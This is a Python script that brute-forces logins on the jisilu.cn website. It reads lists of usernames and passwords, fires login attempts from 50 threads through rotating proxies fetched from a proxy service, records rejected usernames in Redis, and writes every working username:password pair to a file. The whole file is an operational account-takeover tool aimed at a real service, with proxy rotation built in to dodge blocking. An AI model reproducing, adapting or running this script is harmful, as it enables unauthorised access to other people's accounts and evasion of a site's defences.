# -*- coding: utf-8 -*-
# website: http://30daydo.com
# @Time : 2020/9/5 22:41
# @File : crack_jsl.py
import codecs
import json
import threading
import pymongo
import requests
import time
from loguru import logger
# from settings import _json_data
import config_
import redis

THREAD_NUM =50
logger.add('crack.log')


class CrackSpider():

    def __init__(self, *args, **kwargs):
        super(CrackSpider, self).__init__(*args, **kwargs)
        # host = _json_data['mongo']['qq']['host']
        # port = _json_data['mongo']['qq']['port']
        # self.doc = pymongo.MongoClient(host=host, port=port)

        filename = 'creator.txt'
        with codecs.open(filename, 'r', encoding='utf8') as f:
            conent = f.readlines()
            self.content = list(map(lambda x: x.strip(), conent))

        self.url = 'https://www.jisilu.cn/account/ajax/login_process/'
        self.data = {
            'return_url': 'https://www.jisilu.cn/',
            'user_name': '',
            'password': '',
            'net_auto_login': '1',
            '_post_type': 'ajax',
        }
        self.headers = {
            'Host': 'www.jisilu.cn', 'Connection': 'keep-alive', 'Pragma': 'no-cache',
            'Cache-Control': 'no-cache', 'Accept': 'application/json,text/javascript,*/*;q=0.01',
            'Origin': 'https://www.jisilu.cn', 'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': 'Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/67.0.3396.99Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'Referer': 'https://www.jisilu.cn/login/',
            'Accept-Encoding': 'gzip,deflate,br',
            'Accept-Language': 'zh,en;q=0.9,en-US;q=0.8'
        }

        with open('password.txt', 'r') as f:
            password_list = f.readlines()
            self.password_list = list(map(lambda x: x.strip(), password_list))

        self.proxy_url = config_.proxy
        self.__redis = redis.StrictRedis(host=config_.redis_host, password=config_.redis_password)

    def parse_user(self,i):
        logger.info(f'in thread {i}')
        user = True
        while user:
            user = self.content.pop()
            for password in self.password_list:
                data = self.data.copy()
                if self.__redis.sismember('username_run', user):
                    continue

                data['user_name'] = user
                data['password'] = password
                # print(password)
                proxy = self.get_proxy()
                # print(proxy)
                try:
                    r = requests.post(
                    url=self.url,
                    headers=self.headers,
                    data=data,
                    proxies=proxy,
                    cookies=None,
                    # verify=False
                )
                except Exception as e:
                    logger.error(e)
                    proxy = self.get_proxy()
                    # print(proxy)
                    try:
                        r = requests.post(
                            url=self.url,
                            headers=self.headers,
                            data=data,
                            proxies=proxy,
                            cookies=None,
                            # verify=False
                        )
                    except:
                        pass
                    else:
                        self.parse_data(r, user, password)
                else:
                    self.parse_data(r,user,password)



    def run(self):

        thread_list =[]
        for i in range(THREAD_NUM):
            t = threading.Thread(target=self.parse_user,args=(i,))
            thread_list.append(t)

        for t in thread_list:
            t.start()

        for t in thread_list:
            t.join()

    def get_proxy(self):
        proxyurl = 'http://{}:8101/dynamicIp/common/getDynamicIp.do'.format(self.proxy_url)
        count = 0
        for i in range(3):
            try:
                r = requests.get(proxyurl, timeout=10)
            except Exception as e:
                print(e)
                count += 1
                print('代理获取失败,重试' + str(count))
                time.sleep(1)

            else:
                js = r.json()
                proxyServer = 'http://{0}:{1}'.format(js.get('ip'), js.get('port'))
                proxyServers = 'https://{0}:{1}'.format(js.get('ip'), js.get('port'))
                proxies_random = {
                    'http': proxyServer,
                    'https': proxyServers
                }
                return proxies_random

        return None

    def parse_data(self, response,user,password):
        # print(response.text)
        js_data = json.loads(response.text)
        errno = js_data.get('errno')

        # print('Done')
        if errno != -1:
            logger.info(js_data)
            logger.info('*********')
            logger.info('user==>', user)
            logger.info('password==>', password)
            with open('find.txt','a') as f:
                f.write(f'{user}:{password}')
        if js_data.get('err','')=='用户名或口令无效':
            print('无效，入redis')
            self.__redis.sadd('username_run',user)

if __name__ == '__main__':
    spider = CrackSpider()
    spider.run()
